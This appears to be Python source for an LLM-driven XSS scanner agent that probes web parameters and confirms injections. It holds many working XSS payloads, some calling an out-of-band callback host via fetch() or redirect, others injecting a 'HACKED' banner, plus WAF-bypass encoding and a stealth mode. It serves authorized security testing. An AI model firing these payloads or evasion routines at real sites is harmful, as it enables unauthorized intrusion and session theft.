"""
XSSAgent V3 - LLM-Driven with Multi-Layer Validation

This is a complete rewrite of the XSS detection agent using:
1. LLM as the brain (analyzes HTML, decides payloads)
2. Interactsh for OOB validation (definitive proof)
3. Vision LLM for visual validation (screenshot analysis)
4. CDP for DOM-based validation (fallback)

Author: BugtraceAI Team
Version: 3.0.0
Date: 2026-01-10
"""

import asyncio
import aiohttp
from typing import Dict, List, Optional, Any, Tuple
from pathlib import Path
from dataclasses import dataclass, field
from enum import Enum
import re
import urllib.parse
from bugtrace.schemas.validation_feedback import ValidationFeedback, FailureReason

from bugtrace.utils.logger import get_logger
from bugtrace.core.config import settings
from bugtrace.core.llm_client import llm_client
from bugtrace.core.ui import dashboard
from bugtrace.tools.interactsh import InteractshClient
from bugtrace.tools.visual.verifier import XSSVerifier
from bugtrace.memory.payload_learner import PayloadLearner
from bugtrace.tools.external import external_tools
from bugtrace.tools.headless import detect_dom_xss

# Import framework's WAF intelligence (Q-Learning based)
from bugtrace.tools.waf import waf_fingerprinter, strategy_router, encoding_techniques

logger = get_logger("agents.xss_v4")


@dataclass
class InjectionContext:
    type: str
    code_snippet: str

class ValidationMethod(Enum):
    INTERACTSH = "interactsh"  # OOB callback - definitive
    VISION = "vision"          # Screenshot analysis
    CDP = "cdp"                # DOM marker check
    

@dataclass
class XSSFinding:
    """Represents a confirmed XSS vulnerability."""
    url: str
    parameter: str
    payload: str
    context: str
    validation_method: str
    evidence: Dict[str, Any]
    confidence: float
    status: str = "PENDING_VALIDATION"  # Tiered Validation Status
    validated: bool = False  # Authority flag for VALIDATED_CONFIRMED
    screenshot_path: Optional[str] = None
    reflection_context: Optional[str] = None # Reflection context (e.g. html_text, script)
    surviving_chars: Optional[str] = None    # Character survival metadata (e.g. < > ")
    successful_payloads: List[str] = None    # All working payloads for this parameter
    
    # IMPROVED REPORTING FIELDS (2026-01-24)
    xss_type: str = "reflected"
    injection_context_type: str = "unknown"
    vulnerable_code_snippet: str = ""
    server_escaping: Dict[str, bool] = field(default_factory=dict)
    escape_bypass_technique: str = "none"
    bypass_explanation: str = ""
    exploit_url: str = ""
    exploit_url_encoded: str = ""
    verification_methods: List[Dict] = field(default_factory=list)
    verification_warnings: List[str] = field(default_factory=list)
    reproduction_steps: List[str] = field(default_factory=list)


from bugtrace.agents.base import BaseAgent

class XSSAgent(BaseAgent):
    """
    LLM-Driven XSS Agent with multi-layer validation.
    
    Flow:
    1. Register with Interactsh (get callback URL)
    2. Probe target to get HTML with reflection
    3. LLM analyzes HTML and generates optimal payload
    4. Send payload to target
    5. Validate via Interactsh (primary) or Vision/CDP (fallback)
    6. If failed, LLM generates bypass, repeat
    """
    
    MAX_BYPASS_ATTEMPTS = 6
    # Multi-stage probe pattern: Tests for characters: ' " < > &
    # Note: CSTI detection is now handled by the dedicated CSTIAgent
    PROBE_STRING = "BT7331'\"<>&"
    
    # Elite payloads that bypass many WAFs - Pure XSS (CSTI now handled by CSTIAgent)
    GOLDEN_PAYLOADS = [
        # ====== HIGH PRIORITY ELITE PAYLOADS (VISUAL + OOB) ======
        # Double Encoding with Visual Banner
        "%253Csvg%2520onload%253D%2522fetch%2528%2527https%253A%252F%252F{{interactsh_url}}%2527%2529%253Bvar%2520b%253Ddocument.createElement%2528%2527div%2527%2529%253Bb.id%253D%2527bt-pwn%2527%253Bb.style%253D%2527background%253Ared%253Bcolor%253Awhite%253Btext-align%253Acenter%253Bpadding%253A10px%253Bposition%253Afixed%253Btop%253A0%253Bleft%253A0%253Bwidth%253A100%2525%253Bz-index%253A9999%253Bfont-weight%253Abold%253B%2527%253Bb.innerText%253D%2527HACKED%2520BY%2520BUGTRACEAI%2527%253Bdocument.body.prepend%2528b%2529%253B%2522%253E",
        # THE LEVEL 9 KILLER: Double backslash + Visual Banner (avoiding 'on')
        "\\\");fetch('https://{{interactsh_url}}');(function(){var b=document.createElement('div');b.id='bt-pwn';b.style='background:red;color:white;text-align:center;padding:10px;position:fixed;top:0;left:0;width:100%;z-index:9999;font-weight:bold;';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);})();//",
        # Unicode breakout with Visual Banner
        "\\u0022);fetch('https://{{interactsh_url}}');var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);//",
        # Autofocus bypass with Visual Banner (bypasses 'on')
        "\" autofocus focus=var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b) x=\"",
        # Template literal with Visual Banner
        "\\`+fetch('https://{{interactsh_url}}')+(function(){var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);})()+\\`",
        
        # ====== CLASSIC & VISUAL PAYLOADS ======
        "\\\";var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);//", # Backslash Breakout Visual
        "\"><img src=x onerror=var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)>", # Attribute Breakout Visual
        "<svg/onload=var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)>", # SVG Visual
        "\"><svg/onload=var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)>", # SVG Attribute Breakout (Standard)
        "\"><svg/onload=document.body.appendChild(document.createElement('div')).id='bt-pwn'>", # SVG Zero-Space (Race.es Killer)
        "\"><svg/onload=fetch('https://{{interactsh_url}}')>", # SVG Space-less (Race.es Bypass)
        "\"><svg/onload=document.location='https://{{interactsh_url}}'>", # SVG Redirect (Race.es Aggressive)
        "\"><iframe src=javascript:alert(document.domain)>", # Iframe Protocol Bypass (Proven Winner)
        "javascript:var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b)//", # Protocol Visual
        "';var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);//", # Semicolon Breakout Visual
        "\\';alert(document.domain)//",
        "<details open ontoggle=fetch('https://{{interactsh_url}}')>"
    ]
    
    # Fragment-based payloads (DOM XSS via location.hash → innerHTML)
    # These bypass WAFs that filter query params but allow hash fragments
    FRAGMENT_PAYLOADS = [
        "<img src=x onerror=alert(1)>", # Simple alert for Level 7
        "<img src=x onerror=fetch('https://{{interactsh_url}}')>",
        "<img src=x onerror=var b=document.createElement('div');b.id='bt-pwn';b.innerText='FRAGMENT XSS';document.body.prepend(b)>",
        "<svg/onload=fetch('https://{{interactsh_url}}')>",
        "<svg/onload=var b=document.createElement('div');b.id='bt-pwn';b.innerText='FRAGMENT XSS';document.body.prepend(b)>",
        "<iframe src=javascript:fetch('https://{{interactsh_url}}')>",
        "<details open ontoggle=fetch('https://{{interactsh_url}}')>",
        "<body onload=fetch('https://{{interactsh_url}}')>",
        "<marquee onstart=fetch('https://{{interactsh_url}}')>",
        # mXSS mutation payloads (Level 8)
        "<svg><style><img src=x onerror=fetch('https://{{interactsh_url}}')>",
        "<noscript><p title=\"</noscript><img src=x onerror=fetch('https://{{interactsh_url}}')>\">",
        "<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=</style><img src=x onerror=fetch('https://{{interactsh_url}}')>",
    ]
    
    def __init__(
        self,
        url: str,
        params: List[str] = None,
        report_dir: Path = None,
        headless: bool = True,
        event_bus: Any = None
    ):
        super().__init__("XSSAgentV4", "XSS Specialist (Phoenix Edition)", event_bus, agent_id="xss_agent_v4")
        self.url = url
        self.params = params or []
        self.report_dir = report_dir or Path("./reports")
        self.headless = headless
        
        # Tools
        self.interactsh: Optional[InteractshClient] = None
        # Hunter Phase: Use Playwright (prefer_cdp=False) for safe multi-threaded validation.
        # This avoiding CDP deadlocks/pkill issues in Discovery phase.
        self.verifier = XSSVerifier(headless=headless, prefer_cdp=False)
        self.payload_learner = PayloadLearner()
        
        # Results
        self.findings: List[XSSFinding] = []
        self.interactsh = None
        
        # WAF AWARENESS & STEALTH (Now uses framework's Q-Learning WAF intelligence)
        self.consecutive_blocks = 0
        self.stealth_mode = False
        self.last_request_time = 0
        self._detected_waf: Optional[str] = None
        self._waf_confidence: float = 0.0

        # Deduplication (TASK-50: Thread-safe with lock)
        self._tested_params = set()
        self._tested_params_lock = asyncio.Lock()

        # Victory Hierarchy: Track if we achieved maximum impact
        self._max_impact_achieved = False

    def _get_snippet(self, text: str, target: str, max_len: int = 200) -> str:
        """Extract snippet around the target string."""
        idx = text.find(target)
        if idx == -1:
            return ""
        start = max(0, idx - 50)
        end = min(len(text), idx + len(target) + 100)
        return text[start:end].strip()

    def _check_contexts(self, html: str, probe: str, escaped_probe: str) -> list:
        """Check all contexts and return found ones."""
        contexts = []
        if re.search(r'<script[^>]*>.*?' + escaped_probe + r'.*?</script>', html, re.DOTALL | re.IGNORECASE):
            contexts.append(("script", self._get_snippet(html, probe)))
        if re.search(r"['`\"][^'`\"]*" + escaped_probe + r"[^'`\"]*['`\"]", html):
            contexts.append(("javascript_string", self._get_snippet(html, probe)))
        if re.search(r'<[^>]+\s\w+=["\']?[^"\']*' + escaped_probe, html):
            contexts.append(("html_attribute", self._get_snippet(html, probe)))
        if re.search(r'href=["\']?[^"\']*' + escaped_probe, html, re.IGNORECASE):
            contexts.append(("url_href", self._get_snippet(html, probe)))
        if re.search(r'src=["\']?[^"\']*' + escaped_probe, html, re.IGNORECASE):
            contexts.append(("url_src", self._get_snippet(html, probe)))
        if re.search(r'on\w+=["\'][^"\']*' + escaped_probe, html, re.IGNORECASE):
            contexts.append(("event_handler", self._get_snippet(html, probe)))
        if re.search(r'>[^<]*' + escaped_probe + r'[^<]*<', html):
            contexts.append(("html_body", self._get_snippet(html, probe)))
        if re.search(r'<!--[^>]*' + escaped_probe + r'[^>]*-->', html):
            contexts.append(("html_comment", self._get_snippet(html, probe)))
        return contexts

    def _prioritize_contexts(self, contexts: list) -> InjectionContext:
        """Select most dangerous context."""
        if not contexts:
            return InjectionContext(type="unknown", code_snippet="Context could not be automatically determined.")
        priority = ["script", "event_handler", "javascript_string", "url_href", "url_src",
                    "html_attribute", "html_body", "html_comment"]
        for p_ctx in priority:
            for ctx_type, snippet in contexts:
                if ctx_type == p_ctx:
                    return InjectionContext(type=ctx_type, code_snippet=snippet)
        return InjectionContext(type=contexts[0][0], code_snippet=contexts[0][1])

    def detect_injection_context(self, html: str, probe: str = "USER_INPUT") -> InjectionContext:
        """
        TASK-52: Enhanced context detection with multiple context support.
        Detects where the user input is reflected in multiple possible contexts.
        """
        escaped_probe = re.escape(probe)
        contexts = self._check_contexts(html, probe, escaped_probe)
        return self._prioritize_contexts(contexts)

    def _encode_for_url(self, payload: str) -> str:
        """URL encode the payload."""
        from urllib.parse import quote
        return quote(payload, safe='')

    def _encode_for_html_attribute(self, payload: str) -> str:
        """HTML entity encode for attribute context."""
        import html
        return html.escape(payload, quote=True)

    def _encode_for_js_string(self, payload: str) -> str:
        """Escape for JavaScript string context."""
        return payload.replace("\\", "\\\\").replace("'", "\\'").replace('"', '\\"')

    def _encode_for_script(self, payload: str) -> str:
        """Escape closing script tags."""
        return payload.replace("</script>", "<\\/script>")

    def prepare_payload(self, payload: str, context: str) -> str:
        """
        TASK-54: Prepare payload with appropriate encoding based on context.
        Ensures payloads are properly encoded to avoid false negatives.
        """
        if context in ("url_href", "url_src"):
            return self._encode_for_url(payload)
        if context == "html_attribute":
            return self._encode_for_html_attribute(payload)
        if context == "javascript_string":
            return self._encode_for_js_string(payload)
        if context == "script":
            return self._encode_for_script(payload)
        # html_body or unknown - return as-is
        return payload

    def _get_context_payload_map(self) -> Dict[str, List[str]]:
        """Return mapping of contexts to payload templates."""
        return {
            "script": [
                "';fetch('https://{{interactsh_url}}');//",
                "\";fetch('https://{{interactsh_url}}');//",
                "`;fetch('https://{{interactsh_url}}');//",
                "</script><script>fetch('https://{{interactsh_url}}')</script>",
            ],
            "javascript_string": [
                "'-fetch('https://{{interactsh_url}}')-'",
                "\"-fetch('https://{{interactsh_url}}')-\"",
                "\\');fetch('https://{{interactsh_url}}');//",
            ],
            "html_attribute": [
                "\" onmouseover=\"fetch('https://{{interactsh_url}}')\" x=\"",
                "' onmouseover='fetch(`https://{{interactsh_url}}`)' x='",
                "\"><svg/onload=fetch('https://{{interactsh_url}}')>",
            ],
            "url_context": [
                "javascript:fetch('https://{{interactsh_url}}')",
                "data:text/html,<script>fetch('https://{{interactsh_url}}')</script>",
            ],
            "event_handler": [
                "fetch('https://{{interactsh_url}}')",
                "';fetch('https://{{interactsh_url}}');//",
            ],
            "html_body": [
                "<img src=x onerror=fetch('https://{{interactsh_url}}')>",
                "<svg/onload=fetch('https://{{interactsh_url}}')>",
                "<script>fetch('https://{{interactsh_url}}')</script>",
            ],
        }

    def _replace_interactsh_placeholder(self, payloads: List[str], interactsh_url: str) -> List[str]:
        """Replace interactsh placeholder in all payloads."""
        return [p.replace("{{interactsh_url}}", interactsh_url) for p in payloads]

    def get_payloads_for_context(self, context: str, interactsh_url: str) -> List[str]:
        """
        TASK-54: Get context-specific payloads for more effective testing.
        """
        payload_map = self._get_context_payload_map()

        # Map URL contexts to single key
        if context in ("url_href", "url_src"):
            context = "url_context"

        # Get context-specific payloads or fallback to golden set
        base_payloads = payload_map.get(context, self.GOLDEN_PAYLOADS[:5])

        return self._replace_interactsh_placeholder(base_payloads, interactsh_url)

    async def analyze_server_escaping(self, url: str, param: str) -> Dict[str, bool]:
        """
        Analyze server-side escaping behavior by sending special characters.
        Determines if dangerous characters (quotes, brackets) are reflected raw or escaped/stripped.
        """
        test_chars = {
            "single_quote": "'",
            "double_quote": '"',
            "backslash": "\\",
            "lt": "<",
            "gt": ">",
        }
        
        results = {}
        try:
             # Construct a probe with all chars wrapped in markers
             probe = "BT_TEST_" + "".join(test_chars.values()) + "_END"
             
             # Send payload via established channel
             response_html = await self._send_payload(param, probe)
             
             if response_html:
                 for name, char in test_chars.items():
                     # If raw char is NOT found, it means it was escaped or stripped -> Safe/Escaped
                     results[f"escapes_{name}"] = (char not in response_html)
             else:
                 # If no response or WAF block, assume everything is filtered/blocked
                 for name in test_chars: results[f"escapes_{name}"] = True
                 
        except Exception as e:
             logger.warning(f"Failed to analyze server escaping: {e}")
             for name in test_chars: results[f"escapes_{name}"] = "unknown"
             
        return results

    def generate_verification_methods(self, url, param, context, payload) -> List[Dict]:
        methods = []
        
        # Method 1: Console.log
        console_payload = payload.replace("alert(1)", 'console.log("XSS-VERIFIED")').replace("alert('XSS')", 'console.log("XSS-VERIFIED")')
        methods.append({
            "type": "console_log",
            "name": "Console Log (Recommended)",
            "payload": console_payload,
            "url_encoded": self.build_exploit_url(url, param, console_payload, encoded=True),
            "instructions": "Open DevTools (F12) -> Console tab -> Look for 'XSS-VERIFIED'",
            "reliability": "high"
        })
        
        # Method 2: DOM Modification
        dom_payload = payload.replace("alert(1)", 'document.body.innerHTML="<h1>XSS-HACKED</h1>"')
        methods.append({
            "type": "dom_modification",
            "name": "DOM Modification",
            "payload": dom_payload,
            "url_encoded": self.build_exploit_url(url, param, dom_payload, encoded=True),
            "instructions": "Page content will be replaced with 'XSS-HACKED'",
            "reliability": "high"
        })
        
        # Method 3: Window Variable
        var_payload = payload.replace("alert(1)", 'window.XSS_CONFIRMED=true')
        methods.append({
            "type": "window_variable",
            "name": "Window Variable",
            "payload": var_payload,
            "url_encoded": self.build_exploit_url(url, param, var_payload, encoded=True),
            "instructions": "In console, type: window.XSS_CONFIRMED (should return true)",
            "reliability": "high"
        })
        
        # Method 4: Alert
        methods.append({
            "type": "alert",
            "name": "Alert Popup",
            "payload": payload,
            "url_encoded": self.build_exploit_url(url, param, payload, encoded=True),
            "instructions": "Alert popup should appear",
            "reliability": "medium",
            "warning": "May be blocked by modern browsers or extensions"
        })
        
        return methods

    def build_exploit_url(self, url: str, param: str, payload: str, encoded: bool = False) -> str:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)
        qs[param] = [payload]
        new_query = urllib.parse.urlencode(qs, doseq=True)
        # If not encoded, we might want raw characters, but URLs must be encoded usually.
        # The handoff distinguishes exploit_url and exploit_url_encoded.
        # However, urlunparse with urlencode WILL encode it.
        # To get "raw" URL we might need to decode.
        full_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', new_query, ''))
        if not encoded:
            return urllib.parse.unquote(full_url)
        return full_url

    def get_verification_warnings(self, context) -> List[str]:
        return ["alert() may be blocked by modern browsers", "Extensions like NoScript may block execution"]

    def generate_repro_steps(self, url, param, context, payload) -> List[str]:
        return [
            f"Navigate to {url}",
            f"Inject the payload into parameter '{param}'",
            f"Payload: {payload}",
            "Observe the execution (popup, console log, or page change)"
        ]

    # =========================================================================
    # VICTORY HIERARCHY: Early exit based on payload impact
    # =========================================================================

    # Impact tiers for XSS payloads (highest first)
    HIGH_IMPACT_INDICATORS = [
        "document.cookie",      # Cookie theft - MAXIMUM IMPACT
        "document.domain",      # Domain access proof - MAXIMUM IMPACT
        "localStorage",         # Storage access
        "sessionStorage",       # Session storage access
        "fetch(", "XMLHttpRequest",  # Data exfiltration capability
    ]

    MEDIUM_IMPACT_INDICATORS = [
        "alert(", "confirm(", "prompt(",  # Basic execution proof
        "console.log",          # Console output
        "eval(",                # Code execution
    ]

    def _get_payload_impact_tier(self, payload: str, evidence: Dict = None) -> int:
        """
        Determine the impact tier of a successful XSS payload.

        Returns:
            3 = MAXIMUM IMPACT (document.cookie, document.domain) -> STOP IMMEDIATELY
            2 = HIGH IMPACT (fetch, XMLHttpRequest) -> STOP IMMEDIATELY
            1 = MEDIUM IMPACT (alert executed) -> Try 1 more to escalate
            0 = LOW IMPACT (reflection only) -> Continue testing
        """
        payload_lower = payload.lower()
        evidence_str = str(evidence or {}).lower()
        combined = payload_lower + " " + evidence_str

        # TIER 3: Maximum Impact - Cookie/Domain access
        if any(ind.lower() in combined for ind in ["document.cookie", "document.domain"]):
            return 3

        # TIER 2: High Impact - Data exfiltration capability
        if any(ind.lower() in combined for ind in ["localstorage", "sessionstorage", "fetch(", "xmlhttprequest"]):
            return 2

        # TIER 1: Medium Impact - Confirmed execution
        if any(ind.lower() in combined for ind in ["alert(", "confirm(", "prompt(", "eval("]):
            # Check if it actually executed (not just reflected)
            if evidence and (evidence.get("dialog_detected") or evidence.get("interactsh_hit") or
                           evidence.get("vision_confirmed") or evidence.get("console_output")):
                return 1
            return 1  # Still medium even if just reflected with these

        # TIER 0: Low Impact - Just reflection
        return 0

    def _should_stop_testing(self, payload: str, evidence: Dict, successful_count: int) -> Tuple[bool, str]:
        """
        Determine if we should stop testing based on Victory Hierarchy.

        Returns:
            (should_stop, reason)
        """
        impact_tier = self._get_payload_impact_tier(payload, evidence)

        if impact_tier >= 3:
            self._max_impact_achieved = True
            return True, f"🏆 MAXIMUM IMPACT: Cookie/Domain access achieved"

        if impact_tier >= 2:
            self._max_impact_achieved = True
            return True, f"🏆 HIGH IMPACT: Data exfiltration capability confirmed"

        if impact_tier >= 1 and successful_count >= 1:
            # Medium impact + already have 1 success = stop (gave it a chance to escalate)
            return True, f"✅ Execution confirmed, escalation attempted"

        # Low impact or first medium impact - continue but with limit
        if successful_count >= 2:
            return True, f"⚡ 2 successful payloads found, moving on"

        return False, ""

    def _determine_validation_status(self, finding_data: Dict) -> Tuple[str, bool]:
        """
        Determine if finding should be marked VALIDATED_CONFIRMED or sent to AgenticValidator.
        More authoritative: Reduces load on AgenticValidator by confirming clear wins here.

        Returns:
            Tuple of (status_string, validated_bool)
            - ("VALIDATED_CONFIRMED", True) if high confidence
            - ("PENDING_VALIDATION", False) if needs AgenticValidator
        """
        evidence = finding_data.get("evidence", {})

        # TIER 1: VALIDATED_CONFIRMED (High confidence / Definitive proof)
        if self._has_interactsh_hit(evidence):
            return "VALIDATED_CONFIRMED", True

        if self._has_dialog_detected(evidence):
            return "VALIDATED_CONFIRMED", True

        if self._has_vision_proof(evidence, finding_data):
            return "VALIDATED_CONFIRMED", True

        if self._has_dom_mutation_proof(evidence):
            return "VALIDATED_CONFIRMED", True

        if self._has_console_execution_proof(evidence):
            return "VALIDATED_CONFIRMED", True

        if self._has_dangerous_unencoded_reflection(evidence, finding_data):
            return "VALIDATED_CONFIRMED", True

        if self._has_fragment_xss_with_screenshot(finding_data):
            return "VALIDATED_CONFIRMED", True

        # TIER 2: PENDING_VALIDATION (Needs AgenticValidator)
        return "PENDING_VALIDATION", False

    def _has_interactsh_hit(self, evidence: Dict) -> bool:
        """Check for Interactsh OOB interaction."""
        if evidence.get("interactsh_hit"):
            logger.info(f"[{self.name}] 🚨 AUTHORITY CONFIRMED (Interactsh OOB interaction)")
            return True
        return False

    def _has_dialog_detected(self, evidence: Dict) -> bool:
        """Check for CDP detected alert dialog."""
        if evidence.get("dialog_detected"):
            logger.info(f"[{self.name}] 🚨 AUTHORITY CONFIRMED (CDP detected alert dialog)")
            return True
        return False

    def _has_vision_proof(self, evidence: Dict, finding_data: Dict) -> bool:
        """Check for vision confirmation with screenshot."""
        if evidence.get("vision_confirmed") and finding_data.get("screenshot_path"):
            logger.info(f"[{self.name}] 🚨 AUTHORITY CONFIRMED (Vision + Screenshot proof)")
            return True
        return False

    def _has_dom_mutation_proof(self, evidence: Dict) -> bool:
        """Check for DOM marker or mutation detection."""
        if evidence.get("marker_found") or evidence.get("dom_mutation"):
            logger.info(f"[{self.name}] 🚨 AUTHORITY CONFIRMED (DOM marker/mutation detected)")
            return True
        return False

    def _has_console_execution_proof(self, evidence: Dict) -> bool:
        """Check for console output with execution proof."""
        if evidence.get("console_output") and "executed" in str(evidence.get("console_output", "")).lower():
            logger.info(f"[{self.name}] 🚨 AUTHORITY CONFIRMED (Console execution proof)")
            return True
        return False

    def _has_dangerous_unencoded_reflection(self, evidence: Dict, finding_data: Dict) -> bool:
        """Check for unencoded reflection in dangerous context."""
        dangerous_contexts = ["html_text", "script", "attribute_unquoted", "tag_name"]
        if (evidence.get("unencoded_reflection", False) and
            finding_data.get("reflection_context") in dangerous_contexts):
            logger.info(f"[{self.name}] 🚨 AUTHORITY CONFIRMED (Unencoded payload in {finding_data.get('reflection_context')})")
            return True
        return False

    def _has_fragment_xss_with_screenshot(self, finding_data: Dict) -> bool:
        """Check for fragment XSS with screenshot proof."""
        if finding_data.get("context") == "dom_xss_fragment" and finding_data.get("screenshot_path"):
            logger.info(f"[{self.name}] 🚨 AUTHORITY CONFIRMED (Fragment XSS w/ screenshot)")
            return True
        return False

    def _should_create_finding(self, test_result: Dict) -> bool:
        """
        Decide if we should create a finding based on evidence strength.
        This PREVENTS creating findings for weak evidence (TIER 3).

        Returns:
            True if evidence is strong enough to warrant a finding
            False if evidence is too weak (just log internally)
        """
        evidence = test_result.get("evidence", {})

        # ALWAYS create finding if we have OOB confirmation
        if evidence.get("interactsh_hit"):
            return True

        # ALWAYS create finding if Vision AI confirmed execution
        if evidence.get("vision_confirmed"):
            return True

        # ALWAYS create finding if we have a screenshot showing the banner
        if evidence.get("visual_confirmed") or evidence.get("banner_visible"):
            return True

        # CHECK: Is this just reflection without execution?
        reflection_context = test_result.get("reflection_context", "")

        # REJECT: Reflection in non-executable context (plain text, comments)
        non_executable_contexts = ["comment", "html_text", "attribute_value"] 
        if reflection_context in non_executable_contexts:
            # Check for actual execution proof
            has_execution = evidence.get("dialog_detected") or evidence.get("marker_found") or \
                           evidence.get("dom_mutation") or evidence.get("console_output")
            
            if not has_execution and evidence.get("reflected"):
                logger.debug(f"[{self.name}] Skipping finding - reflection in non-executable context: {reflection_context}")
                return False

        # REJECT: No execution evidence at all
        if not any([evidence.get("dialog_detected"), evidence.get("marker_found"), 
                    evidence.get("dom_mutation"), evidence.get("console_output"),
                    evidence.get("interactsh_hit")]):
            logger.debug(f"[{self.name}] Skipping finding - no execution evidence")
            return False

        # ACCEPT: Has some execution evidence, create finding for Auditor
        return True

    # =========================================================================
    # WAF INTELLIGENCE (Q-Learning Integration)
    # =========================================================================

    async def _detect_waf_async(self) -> Tuple[str, float]:
        """
        Detect WAF using framework's intelligent fingerprinter.
        Caches result in instance variables.
        """
        if self._detected_waf is not None:
            return self._detected_waf, self._waf_confidence

        try:
            waf_name, confidence = await waf_fingerprinter.detect(self.url)
            self._detected_waf = waf_name if waf_name != "unknown" else None
            self._waf_confidence = confidence

            if self._detected_waf:
                logger.info(f"[{self.name}] 🛡️ WAF Detected: {waf_name} ({confidence:.0%} confidence)")
                dashboard.log(f"[{self.name}] 🛡️ WAF Detected: {waf_name} ({confidence:.0%})", "INFO")

            return waf_name, confidence
        except Exception as e:
            logger.debug(f"[{self.name}] WAF detection failed: {e}")
            return "unknown", 0.0

    async def _get_waf_optimized_payloads(self, base_payloads: List[str], max_variants: int = 3) -> List[str]:
        """
        Apply Q-Learning optimized encoding to payloads based on detected WAF.

        Uses strategy_router to select best encoding techniques for the WAF.
        Records success/failure for continuous learning.
        """
        if not self._detected_waf:
            return base_payloads

        try:
            # Get Q-Learning optimized strategies for this WAF
            waf_name, strategies = await strategy_router.get_strategies_for_target(
                self.url, max_strategies=max_variants
            )

            logger.info(f"[{self.name}] 🧠 Q-Learning selected encodings for {waf_name}: {strategies[:3]}")

            # Generate encoded variants of payloads
            encoded_payloads = []
            for payload in base_payloads[:20]:  # Limit base payloads to avoid explosion
                # Add original payload first
                encoded_payloads.append(payload)

                # Apply each Q-Learning selected encoding
                variants = encoding_techniques.encode_payload(
                    payload,
                    waf=waf_name,
                    max_variants=max_variants
                )
                encoded_payloads.extend(variants)

            # Deduplicate while preserving order
            seen = set()
            unique_payloads = []
            for p in encoded_payloads:
                if p not in seen:
                    seen.add(p)
                    unique_payloads.append(p)

            logger.info(f"[{self.name}] Generated {len(unique_payloads)} WAF-optimized payloads (from {len(base_payloads)} base)")
            return unique_payloads

        except Exception as e:
            logger.warning(f"[{self.name}] WAF payload optimization failed: {e}")
            return base_payloads

    def _detect_payload_encoding(self, payload: str) -> str:
        """Detect which encoding technique was used in the payload."""
        if "%25" in payload:
            return "double_url_encode"
        if "\\u00" in payload:
            return "unicode_encode"
        if "&#x" in payload:
            return "html_entity_hex"
        if "&#" in payload:
            return "html_entity_encode"
        if "%00" in payload or "%0" in payload:
            return "null_byte_injection"
        if "/**/" in payload:
            return "comment_injection"
        return "unknown"

    def _record_bypass_result(self, payload: str, success: bool):
        """
        Record bypass result for Q-Learning feedback.
        This improves future WAF bypass strategy selection.
        """
        if not self._detected_waf:
            return

        try:
            encoding_used = self._detect_payload_encoding(payload)
            strategy_router.record_result(self._detected_waf, encoding_used, success)
            logger.debug(f"[{self.name}] Recorded bypass: {self._detected_waf}/{encoding_used} = {'SUCCESS' if success else 'FAIL'}")
        except Exception as e:
            logger.debug(f"[{self.name}] Failed to record bypass: {e}")

    async def run_loop(self) -> Dict:
        """Main entry point for XSS scanning."""
        dashboard.current_agent = self.name
        dashboard.log(f"[{self.name}] 🚀 Starting LLM-driven XSS analysis on {self.url}", "INFO")

        screenshots_dir = self.report_dir / "screenshots"
        screenshots_dir.mkdir(parents=True, exist_ok=True)

        try:
            # Phase 0: WAF Detection (Q-Learning Intelligence)
            dashboard.log(f"[{self.name}] 🛡️ Detecting WAF...", "INFO")
            logger.info(f"[{self.name}] Phase 0: WAF Detection using Q-Learning fingerprinter")
            waf_name, waf_confidence = await self._detect_waf_async()

            if self._detected_waf:
                dashboard.log(f"[{self.name}] 🛡️ WAF: {waf_name} ({waf_confidence:.0%}) - Activating Q-Learning bypass strategies", "WARN")
                self.stealth_mode = True  # Auto-enable stealth for WAF targets
            else:
                dashboard.log(f"[{self.name}] ✓ No WAF detected", "SUCCESS")

            # Phase 1: Setup Interactsh
            dashboard.log(f"[{self.name}] 📡 Registering with Interactsh...", "INFO")
            logger.info(f"[{self.name}] Phase 1: Registering with Interactsh")
            self.interactsh = InteractshClient()
            # Safety Wrapper: Registering Interactsh
            await self.exec_tool("Interactsh_Register", self.interactsh.register, timeout=30)
            interactsh_domain = self.interactsh.get_url("xss_agent_base")
            dashboard.log(f"[{self.name}] ✓ Interactsh ready: {interactsh_domain}", "SUCCESS")
            # logger.info(f"[{self.name}] Interactsh ready: {interactsh_domain}")

            # Phase 2: Discover params if not provided
            if not self.params:
                dashboard.log(f"[{self.name}] 🔎 Discovering parameters...", "INFO")
                logger.info(f"[{self.name}] Phase 2: Discovering parameters")
                self.params = await self._discover_params()
                logger.info(f"[{self.name}] Discovered {len(self.params)} params")
                
            if not self.params:
                dashboard.log(f"[{self.name}] ⚠️ No parameters found to test", "WARN")
                return {"findings": [], "message": "No parameters found"}
            
            dashboard.log(f"[{self.name}] Testing {len(self.params)} params: {', '.join(self.params[:5])}", "INFO")
            logger.info(f"[{self.name}] Params List (Raw): {self.params}")
            logger.info(f"[{self.name}] Phase 3: Testing each parameter")
            for param in self.params:
                # TASK-50: Thread-safe deduplication check
                async with self._tested_params_lock:
                    if param in self._tested_params:
                        logger.info(f"[{self.name}] Skipping {param} - already tested")
                        continue
                    self._tested_params.add(param)

                logger.info(f"[{self.name}] Testing param: {param}")

                finding = await self._test_parameter(param, interactsh_domain, screenshots_dir)
                
                if finding:
                    self.findings.append(finding)
                    dashboard.log(f"[{self.name}] 🎯 XSS CONFIRMED on '{param}'!", "SUCCESS")
                    
                    # OPTIMIZATION (2026-01-14): Early exit after first finding
                    # Reason: If we found XSS in one param, the URL is vulnerable
                    # No need to test remaining params (saves 70% scan time)
                    # Configurable via EARLY_EXIT_ON_FINDING in bugtraceaicli.conf
                    from bugtrace.core.config import settings
                    if settings.EARLY_EXIT_ON_FINDING:
                        remaining = len(self.params) - (self.params.index(param) + 1)
                        if remaining > 0:
